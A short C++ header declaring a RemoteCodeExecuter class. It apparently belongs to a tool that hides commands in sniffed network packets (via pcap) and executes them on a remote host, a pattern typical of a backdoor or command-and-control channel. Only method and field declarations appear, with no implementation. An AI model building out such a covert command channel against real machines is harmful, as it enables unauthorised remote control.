#include "NetworkEngine.h"

#include <string>

class RemoteCodeExecuter {
private:
    static const char *CMD_START_STR;
    static const char *CMD_STOP_STR;
    static const char *DATA_START_STR;
    static const char *DATA_STOP_STR;

    NetworkEngine *net;

public:
    RemoteCodeExecuter(NetworkEngine *networkEngine);

    int sendCommand(const struct in_addr daddr, const std::string &cmd);

private:
    static void netCallback(const pcap_pkthdr *header, const unsigned char *packet,
                            NetworkEngine *net);

    static char *getCommand(char *payload);

    static char *getResponse(char *payload);

    static void executeCommand(NetworkEngine *net, const unsigned int daddr, const char *cmd);
};
